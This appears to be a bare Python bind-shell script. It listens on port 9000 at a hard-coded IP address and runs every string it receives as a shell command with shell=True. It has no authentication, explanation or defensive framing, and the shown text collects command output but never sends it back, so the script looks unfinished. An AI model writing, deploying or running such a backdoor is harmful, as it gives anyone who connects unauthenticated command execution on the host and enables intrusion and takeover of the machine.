#!/usr/bin/python3

import socket as s
import subprocess as sp

s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
s1.bind(("46.101.18.123", 9000))
s1.listen(1)
c, a = s1.accept()

while True:
    d = c.recv(1024).decode()
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
    output = p.stdout.read() + p.stderr.read()
